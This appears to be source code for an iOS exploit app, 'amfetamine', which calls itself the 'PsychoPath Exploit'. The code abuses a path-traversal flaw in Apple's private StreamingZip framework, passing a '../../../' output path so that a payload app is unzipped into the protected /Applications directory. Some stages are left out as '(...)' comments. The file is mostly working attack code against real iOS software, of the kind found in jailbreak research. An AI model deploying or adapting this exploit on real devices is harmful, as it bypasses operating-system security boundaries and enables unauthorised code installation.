//
//  ViewController.m
//  amfetamine
//
//  Created by Sem Voigtländer on 19/11/2017.
//  Copyright © 2017 Sem Voigtländer. All rights reserved.
//

#import "ViewController.h"
#import "StreamingUnzipper.h"
@interface ViewController ()
@property (weak, nonatomic) IBOutlet UIButton *exploit;
- (IBAction)doExploit:(id)sender;
@property int attempts;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.attempts = 0;
    // Do any additional setup after loading the view, typically from a nib.
    printf("=== PsychoPath Exploit ====\n");
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


- (IBAction)doExploit:(id)sender {
    printf("Welcome, starting exploit..\n");
    
    /* For iOS 10.3.2 and below use triple_fetch to escape sandbox and patch amfid */
    /* (...) */
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setEnabled:false];
        [_exploit setTitle:@"Starting..." forState:UIControlStateDisabled];
    });
    
    /* Load the private framework */
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StreamingZip.framework/StreamingZip"] load];
    StreamingUnzipper* Unzipper =  [StreamingUnzipper alloc];
                                                /* Path traversal vulnerability is here */
    [Unzipper setupUnzipperWithOutputPath:@"../../../../../../../../../../../../Applications/" sandboxExtensionToken:"" options:nil withReply:nil];
    
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setTitle:@"Setting up" forState:UIControlStateDisabled];
    });
    printf("Created an unzipper: %p\n",(void*)CFBridgingRetain(Unzipper));
    
    /* (...) Unzip Payload.zip containing our next stage (Application to /Applications */
    printf("Unzipping payload into /Applications.\n");
    dispatch_async(dispatch_get_main_queue(), ^(void){
        [_exploit setTitle:@"Extracting payload" forState:UIControlStateDisabled];
    });
    
    /* Give the extraction some time (10 seconds), if the app's still not in /Applications the extraction failed and thus the exploit */
    printf("Waiting until extraction is complete...\n");
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if(![[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Saigon.app/Saigon"]) {
            printf("Extraction timeout exceeded. Exploit failed :( \n");
            dispatch_async(dispatch_get_main_queue(), ^(void){
                [_exploit setEnabled:true];
                [_exploit setTitle:@"failed, retry" forState:UIControlStateNormal];
                self.attempts++;
                if(_attempts > 4) {
                    [_exploit setTitle:@"Probs don't work" forState:UIControlStateNormal];
                }
            });
        } else {
            [_exploit setTitle:@"Done, please wait" forState:UIControlStateDisabled];
            [NSThread detachNewThreadWithBlock:^(void){
                //Respring bug must be entered here as we need the icon to appear on the homescreen
            }];
        }
    });

}
@end
